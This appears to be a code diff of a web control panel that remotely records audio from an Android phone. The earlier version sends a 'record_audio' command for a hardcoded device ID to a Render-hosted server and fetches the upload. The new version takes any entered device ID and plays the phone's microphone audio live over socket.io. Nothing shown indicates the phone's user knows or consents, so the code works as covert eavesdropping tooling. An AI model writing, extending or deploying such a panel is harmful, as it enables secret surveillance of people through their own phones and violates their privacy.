@@ -4,44 +4,71 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Live Audio Monitor</title>
+    <script src="/socket.io/socket.io.js"></script> 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* 🔥 OLD GUI STYLE RESTORED */
         :root { --accent: #00ff88; --bg: #0a0a0a; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow: hidden; }
+        
         .header { padding: 20px; display: flex; align-items: center; gap: 15px; background: #111; border-bottom: 1px solid #222; }
         .back-btn { color: white; text-decoration: none; font-size: 1.2rem; }
         
-        .mic-container { height: 50vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        /* Input Box for Device ID (Center) */
+        .id-container { margin-top: 20px; }
+        .id-input {
+            background: #222; border: 1px solid #444; color: #00ff88; 
+            padding: 10px 15px; border-radius: 5px; font-size: 16px; 
+            text-align: center; width: 60%; font-weight: bold; letter-spacing: 1px;
+            outline: none;
+        }
+        .id-input:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0,255,136,0.2); }
+
+        .mic-container { height: 45vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
         .mic-circle {
-            width: 120px; height: 120px; background: rgba(0, 255, 136, 0.05);
+            width: 130px; height: 130px; background: rgba(0, 255, 136, 0.05);
             border-radius: 50%; display: flex; align-items: center; justify-content: center;
             border: 2px solid var(--accent); position: relative; transition: 0.3s;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1);
         }
         .mic-circle.active { animation: pulse 1.5s infinite; background: rgba(0, 255, 136, 0.2); }
         
         @keyframes pulse {
             0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
-            70% { box-shadow: 0 0 0 30px rgba(0, 255, 136, 0); }
+            70% { box-shadow: 0 0 0 40px rgba(0, 255, 136, 0); }
             100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
         }
 
         .visualizer { display: flex; gap: 6px; height: 60px; align-items: center; margin-top: 40px; }
-        .bar { width: 6px; height: 15px; background: var(--accent); border-radius: 10px; transition: 0.15s; opacity: 0.3; }
-        .active-bar { opacity: 1; }
+        .bar { width: 8px; height: 15px; background: var(--accent); border-radius: 10px; transition: 0.1s; opacity: 0.3; }
+        .active-bar { opacity: 1; box-shadow: 0 0 10px #00ff88; }
 
-        .controls { padding: 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
-        .btn-group { display: flex; gap: 15px; }
-        .btn { background: #1a1a1a; border: 1px solid #333; color: white; padding: 15px 35px; border-radius: 30px; cursor: pointer; display: flex; align-items: center; gap: 10px; font-weight: 600; }
-        .btn.active { background: var(--accent); color: black; border-color: var(--accent); }
+        .controls { padding: 20px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
+        .btn-group { display: flex; gap: 20px; }
         
-        #audioElement { margin-top: 20px; width: 100%; max-width: 300px; border-radius: 10px; }
+        .btn { 
+            background: #1a1a1a; border: 1px solid #333; color: white; 
+            padding: 15px 40px; border-radius: 30px; cursor: pointer; 
+            display: flex; align-items: center; gap: 10px; font-weight: 600; font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        .btn:hover { background: #333; transform: scale(1.05); }
+        .btn.active { background: var(--accent); color: black; border-color: var(--accent); box-shadow: 0 0 15px rgba(0,255,136,0.4); }
+        .btn.stop:hover { background: #ff4444; border-color: #ff4444; box-shadow: 0 0 15px rgba(255,68,68,0.4); }
+        
+        #statusText { font-family: 'Courier New', monospace; letter-spacing: 1px; }
+
     </style>
 </head>
 <body>
     <div class="header">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-        <h3>Live Mic Monitor</h3>
+        <a href="/" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
+        <h3>Server Live Monitor</h3>
+    </div>
+
+    <div class="id-container">
+        <input type="text" id="targetID" class="id-input" placeholder="ENTER DEVICE ID HERE">
     </div>
 
     <div class="mic-container">
@@ -52,89 +79,124 @@
         <div class="visualizer" id="visualizer">
             <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
             <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div>
         </div>
-        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">Microphone Standby</p>
+        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">WAITING FOR CONNECTION...</p>
     </div>
 
     <div class="controls">
         <div class="btn-group">
-            <button class="btn" id="startBtn" onclick="requestAudio()">
-                <i class="fa-solid fa-play"></i> Record Audio
+            <button class="btn" id="startBtn" onclick="connectAndListen()">
+                <i class="fa-solid fa-play"></i> START
             </button>
-            <button class="btn" id="stopBtn" style="color: #ff4444;" onclick="stopMonitor()">
-                <i class="fa-solid fa-stop"></i> Reset
+            <button class="btn stop" id="stopBtn" style="color: #ff4444;" onclick="stopListen()">
+                <i class="fa-solid fa-stop"></i> STOP
             </button>
         </div>
-        <audio id="audioElement" controls style="display: none;"></audio>
     </div>
 
     <script>
-        const RENDER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "M2103K19I"; // Sahi ID
+        const SERVER_URL = window.location.origin; // Server URL automatically utha lega
+        let socket;
+        let audioContext;
+        let nextTime = 0;
         let vizInterval;
+        let isStreaming = false;
 
-        async function requestAudio() {
-            try {
-                document.getElementById('statusText').innerText = "Sending command to device...";
-                document.getElementById('audioElement').style.display = "none";
-
-                // 1. Phone ko command bhejo
-                const res = await fetch(`${RENDER_URL}/api/send-command`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        device_id: DEVICE_ID, 
-                        command: 'record_audio', 
-                        duration: 10 // 10 second ki recording
-                    })
-                });
-
-                if(res.ok) {
-                    startUIEffects();
-                    document.getElementById('statusText').innerText = "Recording in progress... (10s)";
-                    
-                    // 2. 12 second wait karo (Recording + Upload time)
-                    setTimeout(fetchAudioFile, 12000);
-                }
-            } catch (err) {
-                document.getElementById('statusText').innerText = "Error connecting to server.";
+        function connectAndListen() {
+            // 1. ID Check karo
+            const deviceId = document.getElementById('targetID').value.trim().toUpperCase();
+            if (!deviceId) {
+                alert("⚠️ Please Enter Device ID First!");
+                return;
             }
+
+            // 2. Audio Context Init (Browser Rule)
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioContext.state === 'suspended') {
+                audioContext.resume();
+            }
+
+            document.getElementById('statusText').innerText = "CONNECTING TO " + deviceId + "...";
+            document.getElementById('statusText').style.color = "yellow";
+
+            // 3. Socket Connect
+            if(socket) socket.disconnect(); // Purana connection todo agar hai to
+            socket = io(SERVER_URL);
+
+            socket.on("connect", () => {
+                console.log("Connected to Server");
+                
+                // 🔥 MAIN LOGIC: Sirf is ID wale Room ko Join karo
+                socket.emit("join", deviceId);
+                
+                document.getElementById('statusText').innerText = "🔴 LISTENING: " + deviceId;
+                document.getElementById('statusText').style.color = "#00ff88";
+
+                startUIEffects();
+                isStreaming = true;
+            });
+
+            // 4. Audio Data Receive & Play
+            socket.on("audio-stream", (arrayBuffer) => {
+                if (!isStreaming) return;
+                playPcmChunk(arrayBuffer);
+            });
+
+            socket.on("disconnect", () => {
+                stopListen();
+            });
         }
 
-        async function fetchAudioFile() {
-            try {
-                // Sahi API route jo audio file ka link dega
-                const audioUrl = `${RENDER_URL}/api/get-data/${DEVICE_ID}/audio?t=${new Date().getTime()}`;
-                
-                const audioPlayer = document.getElementById('audioElement');
-                audioPlayer.src = audioUrl;
-                audioPlayer.style.display = "block";
-                
-                stopUIEffects();
-                document.getElementById('statusText').innerText = "New recording received! Click play.";
-                
-                // Auto play if browser allows
-                audioPlayer.play().catch(e => console.log("Manual play required"));
-                
-            } catch (err) {
-                document.getElementById('statusText').innerText = "Failed to fetch audio file.";
+        // 🔥 RAW PCM PLAYER (Android se aane wala raw sound play karega)
+        function playPcmChunk(arrayBuffer) {
+            if (!audioContext) return;
+
+            const int16Array = new Int16Array(arrayBuffer);
+            const float32Array = new Float32Array(int16Array.length);
+
+            for (let i = 0; i < int16Array.length; i++) {
+                float32Array[i] = int16Array[i] / 32768; // Convert 16-bit to Float
             }
+
+            const audioBuffer = audioContext.createBuffer(1, float32Array.length, 44100);
+            audioBuffer.getChannelData(0).set(float32Array);
+
+            const source = audioContext.createBufferSource();
+            source.buffer = audioBuffer;
+            source.connect(audioContext.destination);
+
+            if (nextTime < audioContext.currentTime) {
+                nextTime = audioContext.currentTime;
+            }
+            source.start(nextTime);
+            nextTime += source.buffer.duration;
+            
+            // Visualizer Effect on Data
+            animateBars();
         }
 
+        function stopListen() {
+            isStreaming = false;
+            if (socket) {
+                socket.disconnect();
+                socket = null;
+            }
+            stopUIEffects();
+            document.getElementById('statusText').innerText = "DISCONNECTED";
+            document.getElementById('statusText').style.color = "#888";
+        }
+
+        // --- VISUAL EFFECTS ---
         function startUIEffects() {
             document.getElementById('micCircle').classList.add('active');
             document.getElementById('startBtn').classList.add('active');
             document.querySelectorAll('.bar').forEach(b => b.classList.add('active-bar'));
-            
-            vizInterval = setInterval(() => {
-                document.querySelectorAll('.bar').forEach(b => {
-                    b.style.height = (Math.random() * 45 + 10) + "px";
-                });
-            }, 100);
         }
 
         function stopUIEffects() {
-            clearInterval(vizInterval);
             document.getElementById('micCircle').classList.remove('active');
             document.getElementById('startBtn').classList.remove('active');
             document.querySelectorAll('.bar').forEach(b => {
@@ -143,13 +205,11 @@
             });
         }
 
-        function stopMonitor() {
-            stopUIEffects();
-            const audioPlayer = document.getElementById('audioElement');
-            audioPlayer.pause();
-            audioPlayer.src = "";
-            audioPlayer.style.display = "none";
-            document.getElementById('statusText').innerText = "Microphone Standby";
+        function animateBars() {
+            // Fake animation based on data reception
+            document.querySelectorAll('.bar').forEach(b => {
+                b.style.height = (Math.random() * 40 + 15) + "px";
+            });
         }
     </script>
 </body>
